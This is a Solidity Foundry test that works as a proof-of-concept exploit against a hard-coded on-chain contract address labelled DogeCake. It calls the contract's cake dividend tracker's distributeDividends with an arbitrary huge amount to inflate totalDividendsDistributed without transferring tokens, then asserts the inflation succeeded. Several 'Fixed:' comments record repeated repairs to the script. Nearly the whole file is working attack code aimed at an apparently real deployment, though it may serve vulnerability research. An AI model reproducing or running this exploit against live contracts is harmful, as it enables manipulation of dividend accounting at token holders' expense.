pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDividendPayingToken {
    function totalDividendsDistributed() external view returns (uint256);
    function distributeDividends(uint256 amount) external;
    function distributeDividends() external payable;
}

interface DogeCake {
    function cakeDividendTracker() external view returns (address);
    function dogeDividendTracker() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x88b9BBdaF00770Ba398c9A2e0d3C02D45Dcb9820;
    address attacker; // Fixed: 'this' cannot be used in state variable initialization

    // Fixed: Moved to state variables to persist between setUp and testExploit
    IDividendPayingToken cakeTracker;
    IDividendPayingToken dogeTracker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this); // Fixed: Initialize attacker here

        DogeCake target = DogeCake(TARGET);

        // Fixed: Assign to state variables directly instead of declaring locals
        cakeTracker = IDividendPayingToken(target.cakeDividendTracker());
        dogeTracker = IDividendPayingToken(target.dogeDividendTracker());

        uint256 initialCakeDividends;
        uint256 initialDogeDividends;

        initialCakeDividends = cakeTracker.totalDividendsDistributed();
        initialDogeDividends = dogeTracker.totalDividendsDistributed();

        vm.label(TARGET, "DogeCake");
        vm.label(address(cakeTracker), "CakeDividendTracker");
        vm.label(address(dogeTracker), "DogeDividendTracker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Record initial state
        uint256 beforeCake = cakeTracker.totalDividendsDistributed();
        uint256 beforeDoge = dogeTracker.totalDividendsDistributed();

        // Exploit: Call distributeDividends with arbitrary large amount
        // This inflates totalDividendsDistributed without any actual token transfer
        uint256 exploitAmount = 1_000_000 * 1e18;
        cakeTracker.distributeDividends(exploitAmount);

        // Verify the vulnerability - totalDividendsDistributed should be inflated
        uint256 afterCake = cakeTracker.totalDividendsDistributed();
        uint256 afterDoge = dogeTracker.totalDividendsDistributed();

        // Oracle check: totalDividendsDistributed must be greater than initial value
        assertGt(afterCake, beforeCake, "Cake tracker totalDividendsDistributed was not inflated");

        // Also verify Doge tracker wasn't affected (only Cake was exploited)
        assertEq(afterDoge, beforeDoge, "Doge tracker should not be affected");

        // Fixed: Removed line with undeclared identifiers 'totalDividendsDistributed' and 'initial_value'
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

